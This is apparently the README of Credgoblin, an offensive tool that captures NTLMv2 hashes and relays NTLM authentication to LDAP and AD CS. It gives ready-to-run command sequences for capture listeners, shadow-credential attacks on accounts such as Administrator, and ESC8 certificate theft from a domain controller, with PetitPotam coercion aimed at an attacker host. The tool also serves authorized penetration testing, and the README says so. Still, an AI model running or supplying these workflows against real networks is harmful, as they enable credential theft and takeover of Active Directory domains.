# Credgoblin

<p align="center">
  <img src="assets/credgoblin-logo.png" alt="Credgoblin Logo" width="400">
</p>

<p align="center">
  <strong>NTLM Hash Capture & Relay Tool</strong><br>
  A Go implementation for capturing NTLMv2 hashes and relaying authentication to LDAP and AD CS.
</p>

---

## Features

| Feature | Description |
|---------|-------------|
| **Hash Capture** | Capture NTLMv2 hashes via SMB (445), HTTP (80), and HTTPS (443) |
| **LDAP Relay** | Relay authentication to LDAP/LDAPS for shadow credentials attacks |
| **ADCS Relay** | Relay to AD CS web enrollment for certificate requests (ESC8) |
| **Shadow Credentials** | Add `msDS-KeyCredentialLink` for PKINIT-based authentication |
| **Cross-Protocol** | SMB→LDAP and SMB→HTTP relay support |
| **Multi-Protocol Server** | SMB1/SMB2 and HTTP/HTTPS with NTLM authentication |

## Installation

```bash
git clone https://github.com/ineffectivecoder/credgoblin.git
cd credgoblin
go build -o credgoblin ./cmd/credgoblin
```

### Requirements

- Go 1.21+
- Root privileges (binding to ports 80, 443, 445)

## Usage

### Hash Capture

Capture NTLMv2 hashes from incoming connections. Hashes are saved in Hashcat `-m 5600` format.

```bash
# Listen on all protocols (SMB + HTTP)
sudo ./credgoblin capture -i 0.0.0.0

# SMB only (port 445)
sudo ./credgoblin capture -i 0.0.0.0 -p 445

# HTTP/HTTPS only (ports 80, 443)
sudo ./credgoblin capture -i 0.0.0.0 -p 80,443

# Custom output file
sudo ./credgoblin capture -i 0.0.0.0 -o captured.txt -v
```

**Options:**
```
-i, --interface    Listen address (default: 0.0.0.0)
-p, --ports        Ports: 80, 443, 445, both, or comma-separated (default: both)
-o, --output       Output file (default: hashes.txt)
-s, --server       Server name to advertise (default: CREDGOBLIN)
-d, --domain       Domain name to advertise (default: WORKGROUP)
-v, --verbose      Verbose output
```

### LDAP Relay

Relay captured NTLM authentication to LDAP for shadow credentials attack.

```bash
# Relay to LDAP
sudo ./credgoblin relay -t ldap://dc.domain.local \
    -u 'CN=TargetUser,CN=Users,DC=domain,DC=local'

# Relay to LDAPS
sudo ./credgoblin relay -t ldaps://dc.domain.local \
    -u 'CN=TargetUser,CN=Users,DC=domain,DC=local'

# Custom PFX output
sudo ./credgoblin relay -t ldap://dc.domain.local \
    -u 'CN=TargetUser,CN=Users,DC=domain,DC=local' \
    -o target.pfx -P 'MyPassword'
```

On success, a PFX file is generated for PKINIT authentication:
```bash
python gettgtpkinit.py -cert-pfx target.pfx -pfx-pass '<password>' domain.local/TargetUser
```

### ADCS Relay

Relay to AD Certificate Services web enrollment (ESC8 attack).

```bash
# Relay to ADCS HTTP
sudo ./credgoblin relay -m adcs \
    -t http://ca.domain.local/certsrv \
    -T User

# Relay to ADCS HTTPS
sudo ./credgoblin relay -m adcs \
    -t https://ca.domain.local/certsrv \
    -T Machine

# Listen on HTTP only (port 80)
sudo ./credgoblin relay -m adcs \
    -t http://ca.domain.local/certsrv \
    -T User -p 80
```

**Options:**
```
-t, --target       Target URL (ldap://, ldaps://, http://, https://)
-m, --mode         Relay mode: ldap or adcs (default: ldap)
-u, --target-user  Target user DN (required for LDAP mode)
-T, --template     Certificate template (required for ADCS mode)
-o, --output       Output PFX path (default: <username>.pfx)
-P, --pfx-pass     PFX password (random if not set)
-p, --ports        Listen ports: 80, 445, or both (default: both)
-v, --verbose      Verbose output
```

## Attack Workflows

### Shadow Credentials via Coercion

```bash
# Terminal 1: Start relay
sudo ./credgoblin relay -t ldap://dc.domain.local \
    -u 'CN=Administrator,CN=Users,DC=domain,DC=local'

# Terminal 2: Coerce authentication
python PetitPotam.py <attacker-ip> <target-server>

# Terminal 1: Use resulting PFX
python gettgtpkinit.py -cert-pfx Administrator.pfx \
    -pfx-pass '<pass>' domain.local/Administrator
```

### ESC8 - ADCS HTTP Relay

```bash
# Terminal 1: Start ADCS relay
sudo ./credgoblin relay -m adcs \
    -t http://ca.domain.local/certsrv -T User

# Terminal 2: Coerce DC authentication
python PetitPotam.py <attacker-ip> <dc-ip>

# Terminal 1: Use DC certificate
python gettgtpkinit.py -cert-pfx DC01_.pfx \
    -pfx-pass '<pass>' domain.local/DC01$
```

### WebDAV Hash Capture

```bash
# Start HTTPS listener (required for WebClient)
sudo ./credgoblin capture -i 0.0.0.0 -p 443

# Coerce WebDAV authentication
python PetitPotam.py <attacker-ip>@80/test <target>
```

## Technical Details

### Relay Flow

```
Victim              Credgoblin              Target
   │                    │                     │
   │── NEGOTIATE ──────>│                     │
   │<── Challenge ──────│                     │
   │── Type 1 ─────────>│── Type 1 ──────────>│
   │                    │<── Type 2 ──────────│
   │<── Type 2 ─────────│                     │
   │── Type 3 ─────────>│── Type 3 ──────────>│
   │                    │<── Success ─────────│
   │                    │── Attack ──────────>│
```

### LDAP Authentication

Uses SICILY (Security Integrated Connection over LDAP with Yielding):
- Discovery bind (tag 9) to enumerate mechanisms
- Negotiate bind (tag 10) with NTLM Type 1
- Response bind (tag 11) with NTLM Type 3

### Shadow Credentials

Adds `msDS-KeyCredentialLink` attribute containing:
- RSA 2048-bit public key in BCRYPT_RSAKEY_BLOB format
- Device ID, timestamps, and key metadata
- SHA256 key hash for integrity

Generated PFX includes UPN SAN extension for PKINIT compatibility.

### Hash Format

Captured hashes use Hashcat `-m 5600` format:
```
username::DOMAIN:challenge:NTProofStr:blob
```

## Limitations

- **SMB Signing**: Targets with required SMB signing will reject relay
- **LDAP Signing**: DCs requiring LDAP signing may block relay
- **EPA/Channel Binding**: Server 2025 enforces EPA by default, blocking LDAP relay
- **Certificate Templates**: ADCS relay requires enrollment-enabled templates

## Credits

- [Impacket](https://github.com/fortra/impacket) - ntlmrelayx reference
- [Responder](https://github.com/lgandx/Responder) - Hash capture techniques
- [PKINITtools](https://github.com/dirkjanm/PKINITtools) - PKINIT authentication

## License

MIT

## Disclaimer

For authorized security testing only. Obtain proper authorization before use.
